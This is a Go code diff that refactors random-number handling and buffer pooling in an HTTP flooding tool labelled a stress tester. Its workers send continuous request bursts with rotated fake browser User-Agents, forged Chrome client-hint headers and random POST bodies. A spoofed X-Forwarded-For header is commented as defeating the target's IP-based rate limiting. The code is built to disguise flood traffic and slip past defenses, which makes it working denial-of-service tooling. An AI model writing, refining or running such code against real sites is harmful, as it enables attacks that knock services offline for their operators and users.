@@ -7,7 +7,7 @@ import (
 	"crypto/tls"
 	"fmt"
 	"log/slog"
-	"math/rand"
+	"math/rand/v2"
 	"net"
 	"net/url"
 	"os"
@@ -66,10 +66,9 @@ var (
 
 func init() {
 	// Seed the UA pool with 100 random User-Agent strings.
-	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
 	uaPool = make([]string, 100)
 	for i := range uaPool {
-		uaPool[i] = generateUserAgent(rng)
+		uaPool[i] = generateUserAgent()
 	}
 }
 
@@ -268,9 +267,6 @@ func mapCounts(workers map[string][]workerEntry) map[string]int {
 // ─── Worker ───────────────────────────────────────────────────────────────────
 
 func (m *Manager) workerLoop(ctx context.Context, ip string) {
-	// Each worker has its own rand source — no lock contention on the global source.
-	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
-
 	hostHdr := m.cfg.Target.Hostname()
 	if m.cfg.CustomHost != "" {
 		hostHdr = m.cfg.CustomHost
@@ -306,7 +302,7 @@ func (m *Manager) workerLoop(ctx context.Context, ip string) {
 		}
 		backoff = 50 * time.Millisecond // reset on successful dial
 
-		method := httpMethods[rng.Intn(len(httpMethods))]
+		method := httpMethods[rand.IntN(len(httpMethods))]
 
 		// sendBurst returns false when the connection is dead; re-dial in that case.
 	burstLoop:
@@ -316,7 +312,7 @@ func (m *Manager) workerLoop(ctx context.Context, ip string) {
 				conn.Close()
 				return
 			default:
-				alive := m.sendBurst(conn, rng, hostHdr, method)
+				alive := m.sendBurst(conn, hostHdr, method)
 				if alive {
 					m.totalReqs.Add(1)
 				} else {
@@ -333,20 +329,29 @@ func (m *Manager) workerLoop(ctx context.Context, ip string) {
 
 // sendBurst sends one HTTP request on conn and drains a small response chunk.
 // Returns true if the connection is still usable, false if it should be closed and re-dialled.
-func (m *Manager) sendBurst(conn net.Conn, rng *rand.Rand, hostHdr, method string) (alive bool) {
+func (m *Manager) sendBurst(conn net.Conn, hostHdr, method string) (alive bool) {
 	buf := bufPool.Get().(*bytes.Buffer)
 	buf.Reset()
 
-	var bodyBytes []byte
-	buildRequest(buf, m.cfg, rng, method, hostHdr, &bodyBytes)
+	var bodyBuf *bytes.Buffer
+	if method == "POST" {
+		bodyBuf = bodyBufPool.Get().(*bytes.Buffer)
+		bodyBuf.Reset()
+	}
+
+	buildRequest(buf, m.cfg, method, hostHdr, bodyBuf)
 
 	// Write header (and optional body) directly from pool buffer — no intermediate copy.
 	bufs := net.Buffers{buf.Bytes()}
-	if method == "POST" && len(bodyBytes) > 0 {
-		bufs = append(bufs, bodyBytes)
+	if method == "POST" && bodyBuf != nil && bodyBuf.Len() > 0 {
+		bufs = append(bufs, bodyBuf.Bytes())
 	}
 	_, writeErr := bufs.WriteTo(conn)
+	
 	bufPool.Put(buf) // safe: buf.Bytes() has already been consumed by WriteTo
+	if bodyBuf != nil {
+		bodyBufPool.Put(bodyBuf)
+	}
 
 	if writeErr != nil {
 		return false
@@ -373,8 +378,8 @@ func (m *Manager) sendBurst(conn net.Conn, rng *rand.Rand, hostHdr, method strin
 }
 
 // buildRequest writes a raw HTTP/1.1 request into buf.
-// bodyBytes is set (non-nil) only for POST.
-func buildRequest(buf *bytes.Buffer, cfg StressConfig, rng *rand.Rand, method, hostHdr string, bodyBytes *[]byte) {
+// bodyBuf is populated only for POST.
+func buildRequest(buf *bytes.Buffer, cfg StressConfig, method, hostHdr string, bodyBuf *bytes.Buffer) {
 	hostPort := hostHdr
 	if cfg.Port != 80 && cfg.Port != 443 {
 		hostPort = hostHdr + ":" + strconv.Itoa(cfg.Port)
@@ -395,16 +400,16 @@ func buildRequest(buf *bytes.Buffer, cfg StressConfig, rng *rand.Rand, method, h
 	buf.WriteString(hostPort)
 	buf.WriteString("\r\n")
 
-	ua := randomUserAgent(rng)
+	ua := randomUserAgent()
 	buf.WriteString("User-Agent: " + ua + "\r\n")
 	buf.WriteString("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n")
-	buf.WriteString("Accept-Language: " + languages[rng.Intn(len(languages))] + "\r\n")
+	buf.WriteString("Accept-Language: " + languages[rand.IntN(len(languages))] + "\r\n")
 	buf.WriteString("Accept-Encoding: gzip, deflate, br\r\n")
 	buf.WriteString("DNT: 1\r\n")
 
 	// sec-ch-ua is a Chrome-only header; real Firefox never sends it.
 	if isChromeUA(ua) {
-		cv := randomChromeVersion(rng)
+		cv := randomChromeVersion()
 		buf.WriteString("sec-ch-ua: \"Google Chrome\";v=\"")
 		buf.WriteString(cv)
 		buf.WriteString("\", \"Chromium\";v=\"")
@@ -412,7 +417,7 @@ func buildRequest(buf *bytes.Buffer, cfg StressConfig, rng *rand.Rand, method, h
 		buf.WriteString("\", \";Not A Brand\";v=\"99\"\r\n")
 		buf.WriteString("sec-ch-ua-mobile: ?0\r\n")
 		buf.WriteString("sec-ch-ua-platform: \"")
-		buf.WriteString(randomPlatform(rng))
+		buf.WriteString(randomPlatform())
 		buf.WriteString("\"\r\n")
 	}
 
@@ -424,23 +429,22 @@ func buildRequest(buf *bytes.Buffer, cfg StressConfig, rng *rand.Rand, method, h
 	buf.WriteString("Cache-Control: no-cache\r\n")
 	// X-Forwarded-For spoofing: defeats IP-based rate limiting on the target.
 	buf.WriteString("X-Forwarded-For: ")
-	buf.WriteString(strconv.Itoa(rng.Intn(256)))
+	buf.WriteString(strconv.Itoa(rand.IntN(256)))
 	buf.WriteByte('.')
-	buf.WriteString(strconv.Itoa(rng.Intn(256)))
+	buf.WriteString(strconv.Itoa(rand.IntN(256)))
 	buf.WriteByte('.')
-	buf.WriteString(strconv.Itoa(rng.Intn(256)))
+	buf.WriteString(strconv.Itoa(rand.IntN(256)))
 	buf.WriteByte('.')
-	buf.WriteString(strconv.Itoa(rng.Intn(256)))
+	buf.WriteString(strconv.Itoa(rand.IntN(256)))
 	buf.WriteString("\r\n")
 
 	if method == "POST" {
-		ct := contentTypes[rng.Intn(len(contentTypes))]
-		body := createBody(rng, ct)
-		*bodyBytes = body
+		ct := contentTypes[rand.IntN(len(contentTypes))]
+		createBody(bodyBuf, ct)
 		buf.WriteString("Content-Type: ")
 		buf.WriteString(ct)
 		buf.WriteString("\r\nContent-Length: ")
-		buf.WriteString(strconv.Itoa(len(body)))
+		buf.WriteString(strconv.Itoa(bodyBuf.Len()))
 		buf.WriteString("\r\n")
 	}
 
@@ -565,23 +569,23 @@ func (m *Manager) runStats(ctx context.Context, interval time.Duration) {
 
 // ─── Randomisation helpers ────────────────────────────────────────────────────
 
-func randomUserAgent(rng *rand.Rand) string {
-	return uaPool[rng.Intn(len(uaPool))]
+func randomUserAgent() string {
+	return uaPool[rand.IntN(len(uaPool))]
 }
 
-func generateUserAgent(rng *rand.Rand) string {
+func generateUserAgent() string {
 	osList := []string{
 		"Windows NT 10.0; Win64; x64",
 		"Macintosh; Intel Mac OS X 10_15_7",
 		"X11; Linux x86_64",
 	}
-	os := osList[rng.Intn(len(osList))]
-	if rng.Intn(2) == 0 {
-		v := fmt.Sprintf("%d.0.%d.%d", rng.Intn(30)+90, rng.Intn(4000), rng.Intn(200))
+	os := osList[rand.IntN(len(osList))]
+	if rand.IntN(2) == 0 {
+		v := fmt.Sprintf("%d.0.%d.%d", rand.IntN(30)+90, rand.IntN(4000), rand.IntN(200))
 		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36", os, v)
 	}
-	major := rng.Intn(30) + 70
-	minor := rng.Intn(10)
+	major := rand.IntN(30) + 70
+	minor := rand.IntN(10)
 	return fmt.Sprintf("Mozilla/5.0 (%s; rv:%d.0) Gecko/20100101 Firefox/%d.%d", os, major, major, minor)
 }
 
@@ -589,68 +593,64 @@ func isChromeUA(ua string) bool {
 	return strings.Contains(ua, "Chrome/")
 }
 
-func randomChromeVersion(rng *rand.Rand) string {
-	return strconv.Itoa(rng.Intn(30) + 90)
+func randomChromeVersion() string {
+	return strconv.Itoa(rand.IntN(30) + 90)
 }
 
-func randomPlatform(rng *rand.Rand) string {
-	return []string{"Windows", "macOS", "Linux"}[rng.Intn(3)]
+func randomPlatform() string {
+	return []string{"Windows", "macOS", "Linux"}[rand.IntN(3)]
 }
 
-func randomString(rng *rand.Rand, n int) string {
+func randomString(n int) string {
 	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 	b := make([]byte, n)
 	for i := range b {
-		b[i] = letters[rng.Intn(len(letters))]
+		b[i] = letters[rand.IntN(len(letters))]
 	}
 	return string(b)
 }
 
-func createBody(rng *rand.Rand, ct string) []byte {
-	b := bodyBufPool.Get().(*bytes.Buffer)
-	b.Reset()
-	defer bodyBufPool.Put(b)
+func createBody(b *bytes.Buffer, ct string) {
 	switch ct {
 	case "application/x-www-form-urlencoded":
 		vals := url.Values{}
 		for i := 0; i < 3; i++ {
 			var key, val string
-			if rng.Intn(100) < 70 {
-				switch rng.Intn(3) {
+			if rand.IntN(100) < 70 {
+				switch rand.IntN(3) {
 				case 0:
-					key, val = "username", randomString(rng, 8)
+					key, val = "username", randomString(8)
 				case 1:
 					key = "email"
-					val = fmt.Sprintf("%s@example.com", randomString(rng, 6))
+					val = fmt.Sprintf("%s@example.com", randomString(6))
 				default:
-					key, val = randomString(rng, 5), randomString(rng, 8)
+					key, val = randomString(5), randomString(8)
 				}
 			} else {
-				key, val = randomString(rng, 5), randomString(rng, 8)
+				key, val = randomString(5), randomString(8)
 			}
 			vals.Set(key, val)
 		}
 		b.WriteString(vals.Encode())
 
 	case "application/json":
-		if rng.Intn(2) == 0 {
+		if rand.IntN(2) == 0 {
 			fmt.Fprintf(b, `{"id":%d,"name":"%s","active":%t}`,
-				rng.Intn(10000), randomString(rng, 6), rng.Intn(2) == 1)
+				rand.IntN(10000), randomString(6), rand.IntN(2) == 1)
 		} else {
 			b.WriteByte('{')
 			for i := 0; i < 3; i++ {
 				if i > 0 {
 					b.WriteByte(',')
 				}
-				fmt.Fprintf(b, `"%s":"%s"`, randomString(rng, 5), randomString(rng, 8))
+				fmt.Fprintf(b, `"%s":"%s"`, randomString(5), randomString(8))
 			}
 			b.WriteByte('}')
 		}
 
 	default: // text/plain
-		b.WriteString("text_" + randomString(rng, 12))
+		b.WriteString("text_" + randomString(12))
 	}
-	return b.Bytes()
 }
 
 // ─── Misc helpers ─────────────────────────────────────────────────────────────
